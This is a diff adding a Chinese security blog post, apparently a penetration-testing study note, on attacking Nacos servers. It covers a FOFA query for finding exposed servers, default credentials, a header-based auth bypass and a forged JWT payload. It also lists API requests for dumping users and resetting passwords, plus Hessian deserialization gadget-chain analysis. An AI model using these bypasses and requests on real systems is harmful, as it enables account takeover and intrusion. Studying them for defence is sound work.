@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mayylu.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言Nacos是阿里搞得一个统一管理的配置注册中心，默认端口是8848 ，fofa搜app&#x3D;&quot;NACOS&quot; &amp;&amp; icon_hash&#x3D;&quot;13942501&quot;能搜出一堆，而且在渗透中不论是内网还是外网都十分管用，最简单的利用方法就是看配置文件搞数据库，后台密码，既然在工作中遇到了，就简单记录一下，不要只当个脚本小子">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos">
+<meta property="og:url" content="https://mayylu.github.io/2023/06/03/java/Nacos%20%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="mayylu">
+<meta property="og:description" content="前言Nacos是阿里搞得一个统一管理的配置注册中心，默认端口是8848 ，fofa搜app&#x3D;&quot;NACOS&quot; &amp;&amp; icon_hash&#x3D;&quot;13942501&quot;能搜出一堆，而且在渗透中不论是内网还是外网都十分管用，最简单的利用方法就是看配置文件搞数据库，后台密码，既然在工作中遇到了，就简单记录一下，不要只当个脚本小子">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-06-03T06:20:19.000Z">
+<meta property="article:modified_time" content="2024-06-08T12:22:06.134Z">
+<meta property="article:author" content="mayylu">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://mayylu.github.io/2023/06/03/java/Nacos%20%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mayylu.github.io/2023/06/03/java/Nacos%20%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/","path":"2023/06/03/java/Nacos 利用分析/","title":"Nacos"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Nacos | mayylu</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mayylu</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nacos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">Nacos身份认证绕过漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nacos-User-Agent%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">Nacos User-Agent权限绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JWT%E9%BB%98%E8%AE%A4secretKey"><span class="nav-number">2.2.</span> <span class="nav-text">JWT默认secretKey</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nacos-Jraft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">Nacos Jraft Hessian反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hessian"><span class="nav-number">3.1.</span> <span class="nav-text">Hessian</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="nav-number">3.1.1.</span> <span class="nav-text">基本用法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.1.2.</span> <span class="nav-text">Hessian反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MapDeserializer"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">MapDeserializer</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">3.2.</span> <span class="nav-text">利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bcel"><span class="nav-number">3.2.1.</span> <span class="nav-text">bcel</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#javax-swing-UIDefaults"><span class="nav-number">3.2.1.1.</span> <span class="nav-text">javax.swing.UIDefaults</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sun-swing-SwingLazyValue"><span class="nav-number">3.2.1.2.</span> <span class="nav-text">sun.swing.SwingLazyValue</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#com-sun-org-apache-bcel-internal-util-JavaWrapper"><span class="nav-number">3.2.1.3.</span> <span class="nav-text">com.sun.org.apache.bcel.internal.util.JavaWrapper</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">3.2.1.4.</span> <span class="nav-text">实例</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xslt"><span class="nav-number">3.2.2.</span> <span class="nav-text">xslt</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-number">4.</span> <span class="nav-text">攻击客户端</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nacos-client-Yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.1.</span> <span class="nav-text">Nacos-client Yaml反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#snakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">4.1.1.</span> <span class="nav-text">snakeYaml反序列化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nacos%E7%BB%93%E5%90%88Spring-Cloud-Gateway-RCE%E5%88%A9%E7%94%A8"><span class="nav-number">4.2.</span> <span class="nav-text">Nacos结合Spring Cloud Gateway RCE利用</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mayylu</p>
+  <div class="site-description" itemprop="description">学习是一种生活态度</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayylu.github.io/2023/06/03/java/Nacos%20%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mayylu">
+      <meta itemprop="description" content="学习是一种生活态度">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mayylu">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Nacos
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-06-03 14:20:19" itemprop="dateCreated datePublished" datetime="2023-06-03T14:20:19+08:00">2023-06-03</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2024-06-08 20:22:06" itemprop="dateModified" datetime="2024-06-08T20:22:06+08:00">2024-06-08</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Nacos是阿里搞得一个统一管理的配置注册中心，默认端口是8848 ，fofa搜<code>app=&quot;NACOS&quot; &amp;&amp; icon_hash=&quot;13942501&quot;</code>能搜出一堆，而且在渗透中不论是内网还是外网都十分管用，最简单的利用方法就是看配置文件搞数据库，后台密码，既然在工作中遇到了，就简单记录一下，不要只当个脚本小子<br> <span id="more"></span></p>
+<h2 id="Nacos身份认证绕过漏洞分析"><a href="#Nacos身份认证绕过漏洞分析" class="headerlink" title="Nacos身份认证绕过漏洞分析"></a>Nacos身份认证绕过漏洞分析</h2><p>Nacos控制台默认口令漏洞(nacos,nacos),除此之外Nacos鉴权机制还可以被绕过</p>
+<h3 id="Nacos-User-Agent权限绕过"><a href="#Nacos-User-Agent权限绕过" class="headerlink" title="Nacos User-Agent权限绕过"></a>Nacos User-Agent权限绕过</h3><p>漏洞影响版本: Nacos &lt;= 2.0.0-ALPHA.1<br>请求时加上header serverIdentity: security,就可以跳过鉴权</p>
+<h3 id="JWT默认secretKey"><a href="#JWT默认secretKey" class="headerlink" title="JWT默认secretKey"></a>JWT默认secretKey</h3><p>漏洞影响版本: Nacos &lt;= 2.2.0<br>Nacos鉴权用的jwt但是JWT密钥在2.2.0之前是默认的，所以可以自定义成功通过鉴权<br>构造的payload很简单,一个用户名加一个时间戳，只要时间戳没过期，就能通过</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;nacos&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;exp&quot;</span>: <span class="number">9999999999</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传入方式，可以加参数<code>accessToken=</code>，或者加header <code>Authorization: Bearer</code></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">读取用户账号密码:</span><br><span class="line">GET /nacos/v1/auth/users?pageNo=1&amp;pageSize=9</span><br><span class="line"></span><br><span class="line">添加用户:</span><br><span class="line">POST /nacos/v1/auth/users?username=test&amp;password=test&quot;</span><br><span class="line"></span><br><span class="line">任意用户密码更改:</span><br><span class="line">PUT /nacos/v1/auth/users?username=test&amp;newPassword=test1234&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Nacos-Jraft-Hessian反序列化"><a href="#Nacos-Jraft-Hessian反序列化" class="headerlink" title="Nacos Jraft Hessian反序列化"></a>Nacos Jraft Hessian反序列化</h2><p>漏洞影响版本: 1.4.0 &lt;= Nacos &lt; 1.4.6 在单机模式下默认不开放7848端口,需使用cluster集群模式运行<br>             2.0.0 &lt;= Nacos &lt; 2.2.3 默认开放7848端口，任意模式启动均受到影响</p>
+<h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><p>Hession 是基于二进制的实现，传输数据更小更快，基于 HTTP 协议传输。<br>Hessian反序列化和java原生反序列化很像，都是直接对Field进行赋值操作的机制，而不是基于Bean属性访问机制</p>
+<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><p>hessian除了配合 web 项目使用，或作为微服务调用的传输协议外，也可以自行封装自行调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="keyword">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream bao = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        HessianOutput output = <span class="keyword">new</span> HessianOutput(bao);<span class="comment">//可以看出就是把ObjectOutputStream变成了HessianOutput</span></span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ByteArrayInputStream bai = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        HessianInput input = <span class="keyword">new</span> HessianInput(bai);</span><br><span class="line">        Object o = input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>除此之外还用HessianInput/HessianOutput、Hessian2Input/Hessian2Output(在 <strong>Hassian jar 3.2.0</strong> 之后，采用了 <strong>Hessian 2.0协议</strong>,同时还兼容 Hessian 1.0)、BurlapInput/BurlapOutput 的相关方法的封装</p>
+<h4 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h4><p>HessianOutput在写入自定义类型时会将其标记为 Map 类型</p>
+<h5 id="MapDeserializer"><a href="#MapDeserializer" class="headerlink" title="MapDeserializer"></a>MapDeserializer</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">readMap</span><span class="params">(AbstractHessianInput in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Map map;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (_type == <span class="keyword">null</span>)<span class="comment">//在没有指定 Map 的具体实现类时，将会默认使用 HashMap </span></span><br><span class="line">      map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (_type.equals(Map.class))</span><br><span class="line">      map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (_type.equals(SortedMap.class))</span><br><span class="line">      map = <span class="keyword">new</span> TreeMap();</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        map = (Map) _ctor.newInstance();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOExceptionWrapper(e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    in.addRef(map);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (! in.isEnd()) &#123;</span><br><span class="line">      map.put(in.readObject(), in.readObject());<span class="comment">//hessian反序列化触发点</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    in.readEnd();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>前面Hessian可以看出起始方法只能为 put方法可以触发的方法，也就是hashCode/equals/compareTo 方法<br>该漏洞主要是针对部分Jraft请求处理时，使用hessian进行反序列化未限制而造成的RCE漏洞，这里就简单分析一下Nacosrce中出现的几条链子</p>
+<h4 id="bcel"><a href="#bcel" class="headerlink" title="bcel"></a>bcel</h4><p>由于hessian-4.0.63存在黑名单限制，不能直接调用命令执行函数，所以只能采用加载字节码或jndi远程调用</p>
+<h5 id="javax-swing-UIDefaults"><a href="#javax-swing-UIDefaults" class="headerlink" title="javax.swing.UIDefaults"></a>javax.swing.UIDefaults</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UIDefaults</span> <span class="keyword">extends</span> <span class="title">Hashtable</span>&lt;<span class="title">Object</span>,<span class="title">Object</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        Object value = getFromHashtable( key );</span><br><span class="line">        <span class="keyword">return</span> (value != <span class="keyword">null</span>) ? value : getFromResourceBundle(key, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="function"><span class="keyword">private</span> Object <span class="title">getFromHashtable</span><span class="params">(<span class="keyword">final</span> Object key)</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">super</span>.get(key);</span><br><span class="line">...........</span><br><span class="line">         <span class="keyword">if</span> (value <span class="keyword">instanceof</span> LazyValue) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            value = ((ActiveValue)value).createValue(<span class="keyword">this</span>);</span><br><span class="line">    &#125;    </span><br></pre></td></tr></table></figure>
+<h5 id="sun-swing-SwingLazyValue"><a href="#sun-swing-SwingLazyValue" class="headerlink" title="sun.swing.SwingLazyValue"></a>sun.swing.SwingLazyValue</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SwingLazyValue</span> <span class="keyword">implements</span> <span class="title">UIDefaults</span>.<span class="title">LazyValue</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">createValue</span><span class="params">(UIDefaults var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ReflectUtil.checkPackageAccess(<span class="keyword">this</span>.className);</span><br><span class="line">            Class var2 = Class.forName(<span class="keyword">this</span>.className, <span class="keyword">true</span>, (ClassLoader)<span class="keyword">null</span>);</span><br><span class="line">            Class[] var3;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.methodName != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var3 = <span class="keyword">this</span>.getClassArray(<span class="keyword">this</span>.args);</span><br><span class="line">                Method var6 = var2.getMethod(<span class="keyword">this</span>.methodName, var3);</span><br><span class="line">                <span class="keyword">this</span>.makeAccessible(var6);</span><br><span class="line">                <span class="keyword">return</span> var6.invoke(var2, <span class="keyword">this</span>.args);<span class="comment">//任意方法调用</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var3 = <span class="keyword">this</span>.getClassArray(<span class="keyword">this</span>.args);</span><br><span class="line">                Constructor var4 = var2.getConstructor(var3);</span><br><span class="line">                <span class="keyword">this</span>.makeAccessible(var4);</span><br><span class="line">                <span class="keyword">return</span> var4.newInstance(<span class="keyword">this</span>.args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h5 id="com-sun-org-apache-bcel-internal-util-JavaWrapper"><a href="#com-sun-org-apache-bcel-internal-util-JavaWrapper" class="headerlink" title="com.sun.org.apache.bcel.internal.util.JavaWrapper"></a>com.sun.org.apache.bcel.internal.util.JavaWrapper</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaWrapper</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String class_name = argv[<span class="number">0</span>];</span><br><span class="line">  ..........</span><br><span class="line">    wrapper.runMain(class_name, new_argv);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//默认使用bcel.classloader</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">JavaWrapper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(getClassLoader());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">JavaWrapper</span><span class="params">(java.lang.ClassLoader loader)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.loader = loader;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> java.lang.<span class="function">ClassLoader <span class="title">getClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String s = SecuritySupport.getSystemProperty(<span class="string">&quot;bcel.classloader&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((s == <span class="keyword">null</span>) || <span class="string">&quot;&quot;</span>.equals(s))</span><br><span class="line">      s = <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (java.lang.ClassLoader)Class.forName(s).newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runMain</span><span class="params">(String class_name, String[] argv)</span> <span class="keyword">throws</span> ClassNotFoundException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Class   cl    = loader.loadClass(class_name);</span><br><span class="line">    .........</span><br><span class="line">  &#125;</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
